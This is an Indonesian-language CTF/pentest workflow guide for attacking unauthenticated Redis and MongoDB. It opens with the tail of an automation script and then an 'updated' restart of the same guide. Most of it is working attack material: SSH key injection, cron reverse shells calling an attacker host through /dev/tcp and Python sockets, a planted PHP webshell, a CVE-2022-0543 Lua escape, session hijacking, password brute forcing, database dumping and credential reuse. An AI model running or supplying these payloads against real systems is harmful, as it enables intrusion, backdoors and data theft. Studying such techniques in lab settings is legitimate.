echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "  Redis Target: $TARGET:$PORT"
echo -e "  SSH Key: $SSH_KEY_PATH"
echo -e "  Command: ssh -i $SSH_KEY_PATH redis@$TARGET"
echo -e "  Command: ssh -i $SSH_KEY_PATH root@$TARGET"
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
```

### Cara Penggunaan Script

```bash
# Save script
chmod +x redis_auto_exploit.sh
# Jalankan
./redis_auto_exploit.sh 10.10.10.100
# Dengan port custom
./redis_auto_exploit.sh 10.10.10.100 6380
```

### MongoDB Auto-Dump Script

```bash
#!/bin/bash
# ================================================================
# mongodb_dump.sh - MongoDB Unauthenticated Auto-Dump
# ================================================================
TARGET=$1
OUTPUT_DIR="mongodb_dump_$(date +%s)"
if [ -z "$TARGET" ]; then
    echo "Usage: $0 TARGET_IP"
    exit 1
fi
echo "[+] Connecting to MongoDB at $TARGET:27017"
mkdir -p "$OUTPUT_DIR"
# Get databases
DBS=$(mongosh "mongodb://$TARGET:27017" --quiet --eval "db.adminCommand('listDatabases').databases.forEach(d => print(d.name))" 2>/dev/null)
for DB in $DBS; do
    echo "[+] Dumping database: $DB"
    mkdir -p "$OUTPUT_DIR/$DB"
    # Get collections
    COLLECTIONS=$(mongosh "mongodb://$TARGET:27017/$DB" --quiet --eval "db.getCollectionNames().forEach(c => print(c))" 2>/dev/null)
    for COLL in $COLLECTIONS; do
        echo "[+]   Dumping collection: $COLL"
        mongosh "mongodb://$TARGET:27017/$DB" --quiet --eval "JSON.stringify(db.$COLL.find().toArray())" 2>/dev/null > "$OUTPUT_DIR/$DB/${COLL}.json"
    done
done
echo "[+] Dump complete! Output in: $OUTPUT_DIR"
```

---

## 📚 LANJUT KE FILE 15

```text
═══════════════════════════════════════════════════════════════════
  ✅  FILE 14d SELESAI — REDIS & NOSQL WORKFLOW
═══════════════════════════════════════════════════════════════════
  Yang sudah dipelajari:
  ✅ Redis unauthenticated attack
  ✅ SSH Key Injection step-by-step
  ✅ Cron backdoor for root shell
  ✅ Webshell drop
  ✅ Redis module loading (RCE)
  ✅ MongoDB unauthenticated attack
  ✅ NoSQL injection (URL + JSON)
  ✅ Attack chaining
  ✅ Decision trees
  ✅ Troubleshooting
  ✅ Real CTF examples
  ✅ Cheatsheet
  ✅ Automation scripts
  🔜 LANJUT KE FILE 15: WEB RECONNAISSANCE
     - Web directory fuzzing (gobuster, dirb, ffuf)
     - Source code analysis
     - LFI / RFI
     - File upload bypass
     - SQL injection manual
  🎯 MUSCLE MEMORY TARGET:
     - Redis = CONFIG SET dir → FILE WRITE
     - MongoDB = show dbs → db.collection.find()
     - NoSQL = username[$ne]=1 → BYPASS
═══════════════════════════════════════════════════════════════════
```

---

**🔑 TIPS MUSCLE MEMORY:**

```text
1. Redis = PING → +PONG = LANSUNG EKSPLOIT!
2. Redis = CONFIG SET dir + CONFIG SET dbfilename = WRITE FILE!
3. MongoDB = show dbs → use → show collections → find()
4. NoSQL = $ne, $gt, $regex → BYPASS LOGIN!
5. Selalu cek user Redis: ps aux | grep redis
6. Root = Cron, Redis = SSH Key, www-data = Webshell\
```

---

# 14d_Redis & MongoDB — Complete Attack Workflow (UPDATED)

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

```bash
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export REDIS_PASS=""
mkdir -p ~/redis_mongo_loot/{redis,mongo,creds,keys,loot,burp}
cd ~/redis_mongo_loot
echo "[*] Target: $TARGET | LHOST: $LHOST"
```

**Output yang diharapkan:**

```text
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
```

---

## ═══════════════════════════════════════

## FASE 0: DETEKSI PORT & SERVICE

## ═══════════════════════════════════════

### Langkah 0.1 — Scan Port Redis & MongoDB

```bash
# Command 1: Scan kedua port sekaligus
nmap -p 6379,27017 -sV -sC $TARGET -oN nmap_nosql.txt

# Command 2: Jika target tidak merespons (firewall)
nmap -p 6379,27017 -sV -Pn $TARGET

# Command 3: Quick banner grab manual
echo -e "PING\r\n" | nc -vn $TARGET 6379
nc -vn $TARGET 27017
```

**OUTPUT BERHASIL ✅ — Redis ditemukan:**

```text
6379/tcp open  redis   Redis key-value store 6.0.16
| redis-info:
|   Version: 6.0.16
|   Operating System: Linux 5.10.0
|   Architecture: 64 bits
|   Process ID: 1234
|   Config File: /etc/redis/redis.conf
```

➡️ Redis port open → Lanjut ke **FASE 1 (Redis)**

**OUTPUT BERHASIL ✅ — MongoDB ditemukan:**

```text
27017/tcp open  mongodb MongoDB 4.4.28
| mongodb-info:
|   MongoDB Build Info:
|     version: 4.4.28
|   net.port: 27017
```

➡️ MongoDB port open → Lanjut ke **FASE 6 (MongoDB)**

**OUTPUT BERHASIL ✅ — Kedua port open:**

```text
6379/tcp  open  redis   Redis 6.0.16
27017/tcp open  mongodb MongoDB 4.4.28
```

➡️ Serang Redis dulu (lebih berbahaya karena bisa file write), lalu MongoDB

**OUTPUT GAGAL ❌ — Port filtered:**

```text
6379/tcp  filtered redis
27017/tcp filtered mongodb
```

➡️ Firewall blocking. Coba:

```bash
# Bypass dengan source port umum
nmap -p 6379,27017 -Pn --source-port 53 $TARGET

# Jika sudah ada akses ke sistem (via LFI, webshell, dll)
redis-cli -h 127.0.0.1 -p 6379 PING
```

---

## ═══════════════════════════════════════

## FASE 1: REDIS — AUTENTIKASI CHECK

## ═══════════════════════════════════════

### Langkah 1.1 — Test Koneksi Redis

```bash
# Command 1: Test paling cepat
redis-cli -h $TARGET -p 6379 PING

# Command 2: Coba langsung ambil info server
redis-cli -h $TARGET -p 6379 INFO server

# Command 3: Banner grab via netcat
echo -e "PING\r\n" | nc -vn $TARGET 6379 2>/dev/null | head -5
```

**OUTPUT BERHASIL ✅ — Unauthenticated (JACKPOT!):**

```text
+PONG
```

➡️ Redis TIDAK ada password. Akses penuh tanpa credentials!  
➡️ **LANGSUNG ke Langkah 1.3 (Recon)**

**OUTPUT GAGAL ❌ — Auth required:**

```text
(error) NOAUTH Authentication required.
```

➡️ Redis butuh password. Lanjut ke **Langkah 1.2 (Brute Force)**

**OUTPUT GAGAL ❌ — Connection refused:**

```text
Could not connect to Redis at 10.10.11.200:6379: Connection refused
```

➡️ Kemungkinan: Redis bind ke 127.0.0.1 saja, protected mode aktif, atau port berbeda:

```bash
# Cek port lain yang mungkin
nmap -p 6380,6381,6382 -sV $TARGET

# Jika sudah dapat akses ke sistem, tunnel via SSH
ssh user@$TARGET -L 6379:127.0.0.1:6379
redis-cli -h 127.0.0.1 -p 6379 PING
```

---

### Langkah 1.2 — Brute Force Redis Password

```bash
# Command 1: Coba default password manual (lebih cepat)
for pass in "" "redis" "admin" "password" "root" "123456" "foobared" "redis123"; do
    result=$(redis-cli -h $TARGET -p 6379 -a "$pass" PING 2>/dev/null)
    if [ "$result" == "+PONG" ] || [ "$result" == "PONG" ]; then
        echo "[+] PASSWORD FOUND: '$pass'"
        export REDIS_PASS="$pass"
        break
    fi
done

# Command 2: Hydra untuk brute force
hydra -P /usr/share/wordlists/rockyou.txt redis://$TARGET:6379

# Command 3: Cari password di file konfigurasi (jika ada akses sistem lain)
cat /etc/redis/redis.conf | grep requirepass
find / -name ".env" -readable 2>/dev/null | xargs grep -i "redis" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Password ditemukan dari loop:**

```text
[+] PASSWORD FOUND: 'foobared'
```

**OUTPUT BERHASIL ✅ — Password dari hydra:**

```text
[6379][redis] host: 10.10.11.200   password: admin123
```

➡️ Simpan dan test:

```bash
export REDIS_PASS="admin123"
redis-cli -h $TARGET -p 6379 -a "$REDIS_PASS" PING
# Output: PONG → lanjut ke Langkah 1.3
```

**OUTPUT BERHASIL ✅ — Password di .env atau config:**

```text
# /etc/redis/redis.conf
requirepass "SuperSecretRedisPass2024!"
```

atau di web app:

```text
REDIS_PASSWORD=SuperSecretRedisPass2024!
REDIS_HOST=10.10.11.200
```

➡️ Coba password tersebut:

```bash
export REDIS_PASS="SuperSecretRedisPass2024!"
redis-cli -h $TARGET -a "$REDIS_PASS" PING
```

**OUTPUT GAGAL ❌ — Hydra tidak bisa crack:**

```text
0 of 1 completed, 0 found
```

➡️ Password tidak ada di rockyou. Opsi:

```bash
# Cari via LFI jika web server ada
curl "http://$TARGET/page?file=../../../../etc/redis/redis.conf"
curl "http://$TARGET/page?file=../../../../var/www/html/.env"

# Google: "site:github.com redis config CTF machine name"
```

---

### Langkah 1.3 — Redis Reconnaissance

```bash
# Buat alias dengan/tanpa password
if [ -n "$REDIS_PASS" ]; then
    alias rcli="redis-cli -h $TARGET -p 6379 -a $REDIS_PASS"
else
    alias rcli="redis-cli -h $TARGET -p 6379"
fi

# === JALANKAN SEMUA RECON INI BERURUTAN ===

# 1. Info lengkap server
rcli INFO server | tee ~/redis_mongo_loot/redis/server_info.txt

# 2. Direktori kerja saat ini — KRITIS untuk file write!
rcli CONFIG GET dir

# 3. Nama file database
rcli CONFIG GET dbfilename

# 4. Cek apakah ada password
rcli CONFIG GET requirepass

# 5. List semua keys
rcli KEYS "*"

# 6. Jumlah total keys
rcli DBSIZE

# 7. Keyspace info
rcli INFO keyspace
```

**OUTPUT BERHASIL ✅ — CONFIG GET dir:**

```text
1) "dir"
2) "/var/lib/redis"
```

➡️ **CATAT DIREKTORI INI!** Ini direktori default Redis.

**OUTPUT BERHASIL ✅ — KEYS * ada data menarik:**

```text
1) "user:admin"
2) "session:abc123"
3) "config:app"
4) "flag"
5) "password"
```

➡️ Baca semua key yang menarik:

```bash
rcli GET flag
rcli GET password
rcli TYPE user:admin        # Cek tipe dulu!
rcli HGETALL user:admin     # Jika tipe HASH
rcli LRANGE session:abc123 0 -1  # Jika tipe LIST
rcli SMEMBERS config:app    # Jika tipe SET
```

**OUTPUT BERHASIL ✅ — Ketemu flag atau password:**

```text
$ rcli GET flag
"HTB{redis_unauth_easy_flag}"

$ rcli GET password
"AdminP@ss2024!"
```

➡️ Simpan credentials:

```bash
echo "Redis data - password: AdminP@ss2024!" >> ~/redis_mongo_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — WRONGTYPE error:**

```text
(error) WRONGTYPE Operation against a key holding the wrong kind of value
```

➡️ Key bukan tipe string:

```bash
rcli TYPE key_name
# Sesuaikan command:
rcli HGETALL key_name        # untuk hash
rcli LRANGE key_name 0 -1   # untuk list
rcli SMEMBERS key_name       # untuk set
rcli ZRANGE key_name 0 -1 WITHSCORES  # untuk sorted set
```

**OUTPUT GAGAL ❌ — KEYS * timeout/freeze:**

```text
(Hang/timeout terjadi)
```

➡️ Terlalu banyak key. Gunakan SCAN:

```bash
rcli SCAN 0
rcli SCAN 0 MATCH "flag*"
rcli SCAN 0 MATCH "password*"
rcli DBSIZE  # Lihat jumlah total dulu
```

---

### Langkah 1.4 — Tentukan User yang Menjalankan Redis

> **Ini adalah langkah kritis** karena menentukan PATH file write yang bisa digunakan.

```bash
# Method 1: Jika sudah punya akses shell di sistem
ps aux | grep redis

# Method 2: Dari Redis sendiri, coba tulis test file ke berbagai lokasi
rcli CONFIG SET dir /root/.ssh/
# Jika OK → Redis berjalan sebagai ROOT

rcli CONFIG SET dir /home/redis/.ssh/
# Jika OK → Redis berjalan sebagai user redis

rcli CONFIG SET dir /var/www/html/
# Jika OK → bisa drop webshell
```

**OUTPUT BERHASIL ✅ — CONFIG SET dir berhasil ke /root/.ssh/:**

```text
OK
```

➡️ Redis berjalan sebagai **ROOT**!

- Gunakan: SSH Key Injection ke `/root/.ssh/` **(Fase 2A)**
- Gunakan: Cron Backdoor **(Fase 2B)**

**OUTPUT BERHASIL ✅ — ps aux output:**

```text
redis   1234  0.1  0.5  /usr/bin/redis-server *:6379
```

➡️ Redis berjalan sebagai user `redis`. Gunakan SSH Key Injection ke `/home/redis/.ssh/`

**OUTPUT GAGAL ❌ — Permission denied saat CONFIG SET:**

```text
(error) ERR: CONFIG SET dir: Permission denied
```

➡️ Coba direktori lain:

```bash
rcli CONFIG SET dir /tmp/
rcli CONFIG SET dir /var/lib/redis/
rcli CONFIG SET dir /var/tmp/
```

**OUTPUT GAGAL ❌ — CONFIG command disabled:**

```text
(error) ERR unknown command 'CONFIG'
```

➡️ Admin disable command CONFIG. Coba:

```bash
# Method 1: Lua RCE (jika Redis 7.0.0-7.0.4)
rcli EVAL "os.execute('id')" 0

# Google: "redis CONFIG disabled bypass CTF"
# Google: "redis lua sandbox escape exploit"
```

---

## ═══════════════════════════════════════

## FASE 2: REDIS — EXPLOITATION PATHS

## ═══════════════════════════════════════

### PATH 2A — SSH Key Injection (Paling Umum di CTF)

> **Prasyarat:** Redis dapat akses ke direktori `.ssh` user

```bash
# STEP 1: Generate SSH keypair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
cat ~/.ssh/redis_exploit.pub
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot

# STEP 2: Format dengan newlines (WAJIB! Tanpa ini GAGAL)
PUB_KEY=$(cat ~/.ssh/redis_exploit.pub)
echo -e "\n\n$PUB_KEY\n\n" > /tmp/redis_key.txt

# STEP 3: Tentukan target path
# JIKA Redis running sebagai redis user:
export SSH_DIR="/home/redis/.ssh/"
export SSH_USER="redis"
# JIKA Redis running sebagai root:
export SSH_DIR="/root/.ssh/"
export SSH_USER="root"

# STEP 4: Inject key (jalankan berurutan)
rcli FLUSHALL
rcli CONFIG SET dir $SSH_DIR
rcli CONFIG SET dbfilename authorized_keys
rcli SET pubkey "\n\n$PUB_KEY\n\n"
rcli SAVE

# STEP 5: Test SSH login
ssh -i ~/.ssh/redis_exploit -o StrictHostKeyChecking=no $SSH_USER@$TARGET
```

**OUTPUT BERHASIL ✅ — SSH berhasil masuk:**

```text
Last login: Mon Jan 20 10:00:00 2025 from 10.10.14.10
redis@target:~$ id
uid=999(redis) gid=999(redis) groups=999(redis)
redis@target:~$ whoami
redis
```

➡️ Dapat shell! Lanjut ke **Fase 5 (Post-Exploitation)**

**OUTPUT BERHASIL ✅ — SSH sebagai root:**

```text
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
root@target:~# cat /root/root.txt
HTB{...}
```

➡️ **ROOT SHELL!** Langsung collect flag dan lanjut ke Fase 5.

**OUTPUT GAGAL ❌ — Permission denied (publickey):**

```text
Permission denied (publickey).
```

➡️ Beberapa penyebab:

```bash
# Kemungkinan 1: Direktori .ssh belum ada — buat dulu via Redis
rcli CONFIG SET dir /home/redis/
rcli CONFIG SET dbfilename .ssh
rcli SET dummy ""
rcli SAVE
# Lalu ulangi inject authorized_keys

# Kemungkinan 2: User Redis berbeda — cek /etc/passwd
curl "http://$TARGET/page?file=../../../../etc/passwd"
# Cari baris: redis:x:999:999::/var/lib/redis:/bin/bash

# Kemungkinan 3: Public key format salah — pastikan ada \n\n
redis-cli -h $TARGET -p 6379 GET pubkey

# Kemungkinan 4: Coba path alternatif
rcli CONFIG SET dir /var/lib/redis/.ssh/
```

---

### PATH 2B — Cron Job Backdoor (Untuk Root Shell)

> **Prasyarat:** Redis berjalan sebagai ROOT atau user yang bisa tulis ke cron dir

```bash
# STEP 1: Setup listener dulu (di terminal terpisah)
nc -lvnp $LPORT

# STEP 2: Inject cron backdoor via Redis
# Untuk Debian/Ubuntu (crontabs/root):
rcli CONFIG SET dir /var/spool/cron/crontabs/
rcli CONFIG SET dbfilename root
rcli SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
rcli SAVE

# Alternatif untuk /etc/cron.d/ (format berbeda, perlu field user):
rcli CONFIG SET dir /etc/cron.d/
rcli CONFIG SET dbfilename redis_backdoor
rcli SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
rcli SAVE

# STEP 3: Tunggu maksimal 1 menit
echo "[*] Menunggu reverse shell (max 1 menit)..."
sleep 65

# Alternatif payload jika bash tidak work:
# Python3:
rcli SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
```

**OUTPUT BERHASIL ✅ — Shell masuk ke listener:**

```text
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.200 45123
bash: cannot set terminal process group (1234): Inappropriate ioctl for device
bash: no job control in this shell
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

➡️ **ROOT SHELL!** Upgrade ke shell interaktif:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter, Enter
export TERM=xterm
```

**OUTPUT GAGAL ❌ — Shell tidak masuk setelah 2 menit:**

```text
(tidak ada koneksi ke listener)
```

➡️ Troubleshoot:

```bash
# 1. Cek apakah cron service aktif (jika punya shell lain)
systemctl status cron
ps aux | grep cron

# 2. Cek format cron (CentOS/RHEL path berbeda)
rcli CONFIG SET dir /var/spool/cron/
# (tanpa crontabs/ untuk CentOS)

# 3. Cek firewall outbound — coba bind shell:
rcli SET cron "\n\n* * * * * root nc -lvnp 5555 -e /bin/bash\n\n"
rcli SAVE
# Dari attacker: nc $TARGET 5555
```

---

### PATH 2C — Webshell Drop

> **Prasyarat:** Ada web server, dan Redis bisa write ke web root

```bash
# STEP 1: Test satu per satu
for path in "/var/www/html/" "/var/www/" "/usr/share/nginx/html/" "/srv/http/" "/opt/lampp/htdocs/"; do
    result=$(rcli CONFIG SET dir "$path" 2>/dev/null)
    if [ "$result" == "OK" ]; then
        echo "[+] WRITABLE PATH: $path"
    fi
done

# STEP 2: Drop webshell ke path yang writable
rcli CONFIG SET dir /var/www/html/
rcli CONFIG SET dbfilename shell.php
rcli SET webshell "<?php if(isset(\$_REQUEST['cmd'])){ echo '<pre>'.htmlspecialchars(shell_exec(\$_REQUEST['cmd'])).'</pre>'; } ?>"
rcli SAVE

# STEP 3: Test webshell
curl "http://$TARGET/shell.php?cmd=id"
curl "http://$TARGET/shell.php?cmd=whoami"
```

**OUTPUT BERHASIL ✅ — Webshell accessible:**

```text
<pre>www-data</pre>
```

➡️ Dapat RCE! Upgrade ke reverse shell:

```bash
# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell via webshell
curl -G "http://$TARGET/shell.php" \
    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
```

**OUTPUT GAGAL ❌ — HTTP 404:**

```text
404 Not Found
```

➡️ File tidak ada di web root. Coba path lain:

```bash
nmap -p 80,443,8080,8443,8000 $TARGET
curl "http://$TARGET/uploads/shell.php?cmd=id"
```

---

### PATH 2D — Lua Script Injection (CVE-2022-0543)

> **Versi vulnerable:** Redis 7.0.0 - 7.0.4 (Debian/Ubuntu packages)

```bash
# Cek versi Redis dulu
rcli INFO server | grep redis_version

# STEP 1: Test basic Lua execution
rcli EVAL "return os.execute('id')" 0

# STEP 2: Exploit CVE-2022-0543
rcli EVAL "
local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
local io = io_l();
local f = io.popen('id', 'r');
local res = f:read('*a');
f:close();
return res
" 0

# STEP 3: Jika berhasil, jalankan reverse shell
rcli EVAL "
local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io');
local io = io_l();
local f = io.popen('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\" &', 'r');
f:close()
" 0
```

**OUTPUT BERHASIL ✅:**

```text
"uid=0(root) gid=0(root) groups=0(root)\n"
```

**OUTPUT GAGAL ❌ — Lua sandbox:**

```text
(error) ERR Error running script: user_script:1: attempt to call a nil value (global 'os')
```

➡️ Coba library path lain:

```bash
rcli EVAL "return package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.2.so.0', 'luaopen_io')" 0
rcli EVAL "return package.loadlib('/usr/lib/liblua.so', 'luaopen_io')" 0
```

---

## ═══════════════════════════════════════

## FASE 3: REDIS — SESSION HIJACKING & CACHE EXPLOIT

## ═══════════════════════════════════════

> **Scenario:** Redis digunakan oleh web application. Cari session token atau cached credentials.

### Langkah 3.1 — Extract Session Data dari Redis

```bash
# List semua keys — cari pattern session
rcli KEYS "session:*"
rcli KEYS "sess_*"
rcli KEYS "*token*"
rcli KEYS "*auth*"

# Baca semua session yang ada
for key in $(rcli KEYS "session:*"); do
    echo "=== Key: $key ==="
    type=$(rcli TYPE "$key")
    echo "Type: $type"
    case $type in
        "string") rcli GET "$key" ;;
        "hash")   rcli HGETALL "$key" ;;
        "list")   rcli LRANGE "$key" 0 -1 ;;
        "set")    rcli SMEMBERS "$key" ;;
    esac
    echo ""
done
```

**OUTPUT BERHASIL ✅ — Session data admin ditemukan:**

```text
=== Key: session:abc123xyz ===
Type: hash
1) "user_id"
2) "1"
3) "username"
4) "admin"
5) "role"
6) "administrator"
7) "is_admin"
8) "true"
```

➡️ Hijack session admin!

```bash
# Ambil session ID
export SESSION_ID="abc123xyz"

# Gunakan session cookie di browser atau curl
curl -H "Cookie: session=$SESSION_ID" "http://$TARGET/admin/"
curl -H "Cookie: PHPSESSID=$SESSION_ID" "http://$TARGET/admin/"

# Atau modifikasi session untuk elevasi privilege:
rcli HSET "session:$SESSION_ID" "role" "administrator"
rcli HSET "session:$SESSION_ID" "is_admin" "true"
```

**OUTPUT BERHASIL ✅ — Cache data dengan credentials:**

```text
=== Key: cache:user:admin ===
Type: string
{"id":1,"username":"admin","password":"$2y$10$abc...","api_key":"sk-admin-xyz"}
```

➡️ Crack hash:

```bash
# Crack bcrypt hash
hashcat -m 3200 '$2y$10$abc...' /usr/share/wordlists/rockyou.txt
```

---

## ═══════════════════════════════════════

## FASE 4: REDIS — POST-EXPLOITATION

## ═══════════════════════════════════════

### Langkah 4.1 — Setelah Dapat Shell dari Redis

```bash
# Di shell redis user / root:

# 1. Stabilkan shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter Enter

# 2. Info dasar
id; whoami; hostname; cat /etc/os-release

# 3. Cari file sensitif
find /home -name "*.txt" -o -name "*.key" -o -name "*.conf" 2>/dev/null
cat /etc/passwd | grep -v nologin | grep -v false

# 4. Cek network untuk pivot target
ss -tunp
arp -n
cat /etc/hosts

# 5. Cek privilege untuk escalation
sudo -l
find / -perm -4000 -type f 2>/dev/null   # SUID binaries

# 6. Cari credentials lain di sistem
grep -ri "password" /etc/ 2>/dev/null | grep -v Binary
find / -name ".env" -readable 2>/dev/null
cat /home/redis/.bash_history  # Sering ada credential di history!
```

**OUTPUT BERHASIL ✅ — SUID binary ditemukan:**

```text
/usr/bin/sudo
/usr/bin/find
```

➡️ Jika dapat `/usr/bin/find`:

```bash
find . -exec /bin/sh -p \; -quit
# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
# → ke <a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>
```

### Langkah 4.2 — Cross-Service Credential Testing dari Redis

```text
Redis Creds/Shell Found
     │
     ├──→ Port 22   (SSH)        → ssh user@$TARGET
     ├──→ Port 21   (FTP)        → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
     ├──→ Port 80   (HTTP)       → login ke web app
     ├──→ Port 3306 (MySQL)      → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ Port 5432 (PostgreSQL) → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
     ├──→ Port 27017 (MongoDB)   → Fase 5 di bawah
     └──→ AD Environment         → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
```

---

## ═══════════════════════════════════════

## FASE 5: MONGODB — DETEKSI & AUTENTIKASI

## ═══════════════════════════════════════

### Langkah 5.1 — Konfirmasi MongoDB & Auth Check

```bash
# Command 1: Connect langsung tanpa auth
mongosh "mongodb://$TARGET:27017" --eval "db.version()" --quiet

# Command 2: Alternatif dengan mongo (legacy client)
mongo --host $TARGET --port 27017 --eval "db.version()" --quiet

# Command 3: Nmap script untuk detail
nmap -p 27017 --script mongodb-info $TARGET
```

**OUTPUT BERHASIL ✅ — Unauthenticated access:**

```text
Current Mongosh Log ID: abc123
Connecting to: mongodb://10.10.11.200:27017
Using MongoDB: 4.4.28
test> 4.4.28
```

➡️ MongoDB TIDAK ada auth! Langsung ke **Langkah 5.2 (Recon)**

**OUTPUT GAGAL ❌ — Auth required:**

```text
MongoServerError: command listDatabases requires authentication
```

➡️ MongoDB butuh credentials. Lanjut ke **Langkah 5.1b**

---

### Langkah 5.1b — Brute Force / Cari Credentials MongoDB

```bash
# Coba default credentials
DEFAULT_CREDS=("admin:admin" "admin:password" "admin:mongo" "root:root" "mongodb:mongodb")

for cred in "${DEFAULT_CREDS[@]}"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    result=$(mongosh "mongodb://$user:$pass@$TARGET:27017/admin" --eval "db.version()" --quiet 2>/dev/null)
    if [ -n "$result" ]; then
        echo "[+] CREDS FOUND: $user:$pass"
        export MONGO_USER="$user"
        export MONGO_PASS="$pass"
        break
    fi
done

# Nmap brute force
nmap -p 27017 --script mongodb-brute $TARGET

# Cari di file konfigurasi
cat /etc/mongod.conf
find / -name "*.env" -readable 2>/dev/null | xargs grep -i "mongo" 2>/dev/null
```

**OUTPUT BERHASIL ✅:**

```text
[+] CREDS FOUND: admin:admin
```

**OUTPUT GAGAL ❌ — Semua default creds gagal:**

```text
MongoServerError: Authentication failed.
```

➡️ Cari di:

- Source code web app (GitHub, Gitea yang exposed)
- File backup via SMB/FTP
- `.env` file via LFI/path traversal
- **Google:** `"inurl:mongod.conf filetype:conf password"`

---

### Langkah 5.2 — MongoDB Reconnaissance Lengkap

```bash
# Buat URI
if [ -n "$MONGO_USER" ]; then
    MONGO_URI="mongodb://$MONGO_USER:$MONGO_PASS@$TARGET:27017"
else
    MONGO_URI="mongodb://$TARGET:27017"
fi

# === JALANKAN SEMUA RECON INI ===

# 1. List semua databases
mongosh "$MONGO_URI" --eval "show dbs" --quiet

# 2. Version info
mongosh "$MONGO_URI" --eval "db.version()" --quiet

# 3. List users (butuh admin)
mongosh "$MONGO_URI/admin" --eval "db.getUsers()" --quiet

# 4. System users dengan hash
mongosh "$MONGO_URI/admin" --eval "db.system.users.find().pretty()" --quiet \
    | tee ~/redis_mongo_loot/mongo/system_users.txt
```

**OUTPUT BERHASIL ✅ — show dbs:**

```text
admin   40.00 KiB
appdb    2.50 MiB
users    1.00 MiB
config  12.00 KiB
local   72.00 KiB
```

➡️ Ada database `appdb` dan `users` — ini yang paling menarik!

---

### Langkah 5.3 — Dump Semua Collections

```bash
# Dump setiap database non-default
for db in appdb users; do
    echo "=== DATABASE: $db ==="
    
    # List collections
    mongosh "$MONGO_URI/$db" --eval "show collections" --quiet
    
    # Dump setiap collection
    collections=$(mongosh "$MONGO_URI/$db" --eval "db.getCollectionNames().join('\n')" --quiet 2>/dev/null)
    
    for coll in $collections; do
        echo "--- Collection: $coll ---"
        mongosh "$MONGO_URI/$db" --eval "db.$coll.find().limit(20).pretty()" --quiet \
            | tee ~/redis_mongo_loot/mongo/${db}_${coll}.txt
        echo "Count: $(mongosh "$MONGO_URI/$db" --eval "db.$coll.count()" --quiet)"
    done
done
```

**OUTPUT BERHASIL ✅ — Collections dengan data sensitif:**

```text
=== DATABASE: appdb ===
users
products
orders
sessions
flags

--- Collection: users ---
[
  { _id: ObjectId("..."), username: "admin", password: "AdminP@ss2024!" },
  { _id: ObjectId("..."), username: "john", password: "john123" }
]

--- Collection: flags ---
[
  { _id: ObjectId("..."), flag: "HTB{mongodb_unauth_easy}" }
]
```

➡️ **JACKPOT!** Simpan credentials ke file:

```bash
echo "admin:AdminP@ss2024!" >> ~/redis_mongo_loot/creds/mongo_creds.txt
echo "john:john123" >> ~/redis_mongo_loot/creds/mongo_creds.txt
```

---

### Langkah 5.4 — Credential Reuse dari MongoDB

```bash
# Test SSH untuk setiap user:password yang ditemukan
while IFS=: read -r user pass; do
    echo "[*] Testing SSH: $user:$pass"
    sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$TARGET" "id" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] SSH SUCCESS: $user:$pass"
        echo "$user:$pass" >> ~/redis_mongo_loot/creds/valid_ssh.txt
    fi
done < ~/redis_mongo_loot/creds/mongo_creds.txt

# Test ke web app login
while IFS=: read -r user pass; do
    result=$(curl -s -X POST "http://$TARGET/login" \
        -d "username=$user&password=$pass" \
        -L --cookie-jar /tmp/cookies.txt)
    if echo "$result" | grep -qi "dashboard\|welcome\|admin"; then
        echo "[+] WEB LOGIN SUCCESS: $user:$pass"
    fi
done < ~/redis_mongo_loot/creds/mongo_creds.txt
```

**OUTPUT BERHASIL ✅ — SSH login berhasil:**

```text
[+] SSH SUCCESS: root:toor
uid=0(root) gid=0(root) groups=0(root)
```

➡️ SSH ke target:

```bash
sshpass -p "toor" ssh root@$TARGET
